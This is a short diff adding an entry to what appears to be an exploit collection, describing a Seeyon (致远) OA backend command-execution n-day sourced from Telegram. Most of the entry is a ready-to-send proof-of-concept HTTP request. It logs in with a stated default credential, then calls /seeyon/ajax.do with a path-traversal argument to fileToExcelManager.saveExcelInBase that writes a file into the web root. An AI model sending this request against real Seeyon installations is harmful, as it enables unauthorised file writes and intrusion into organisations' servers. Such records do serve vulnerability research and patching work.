@@ -1,0 +1,7 @@
+vendor = "致远"
+name = "致远OA /seeyon/ajax.do 后台命令执行"
+type = "RCE"
+source = "TG"
+date = "08.15"
+poc = "需登入致远：audit-admin/seeyon123456 POST /seeyon/ajax.do HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 uacq Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: JSESSIONID=CB1120AE205DAFD7FF70EAF5DC1241B9 Content-Length: 154 Connection: close method=ajaxAction&managerName=fileToExcelManager&managerMethod=saveExcelInBase&arguments=[\"../webapps/ROOT/ceshi.txt\",\"\",{\"columnName\":['HelloWorld']}]"
+label = "nday"
